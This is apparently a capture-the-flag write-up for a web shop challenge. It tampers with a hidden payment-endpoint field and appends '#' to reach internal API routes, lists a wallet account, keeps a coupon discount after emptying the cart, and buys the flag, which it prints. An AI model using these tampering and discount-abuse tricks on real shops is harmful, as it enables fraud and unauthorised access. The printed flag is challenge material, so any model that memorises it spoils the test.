```html
<input type="hidden" name="paymentEndpoint" value="http://payment-api:9090">
```

Web server at localhost:8080

When using `aaa` as `paymentEndpoint` with `AAA` as `wallet`:
`Error while requesting Payment API: Invalid URL: aaa/wallets/AAA/balance`

Coupon code: `I<3CORONA`
Coupon discount stays when products are removed from cart.

Buy flag at: http://staywoke.hax1.allesctf.net/products/1 for 1337 €
Can't use discount with flag

When endpoint: `http://payment-api:9090/#`
`Error from Payment API: "Cannot GET /\n\nTry GETting /help for possible endpoints."`

When endpoint: `http://payment-api:9090/help#`

```json
{
    "endpoints": [
        {
            "method": "GET",
            "path": "/wallets/:id/balance",
            "description": "check wallet balance"
        },
        {
            "method": "GET",
            "path": "/wallets",
            "description": "list all wallets"
        },
        {
            "method": "GET",
            "path": "/help",
            "description": "this help message"
        }
    ]
}
```

When endpoint: `http://payment-api:9090/wallets#`

```json
[{"account":"1337-420-69-93dcbbcd","balance":133500}]
```

Add items worth `10€` to cart, use discount code to get `-2€`, remove all items and add flag to cart and buy using the account above.

Flag: `CSCG{c00l_k1ds_st4y_@_/home/}`
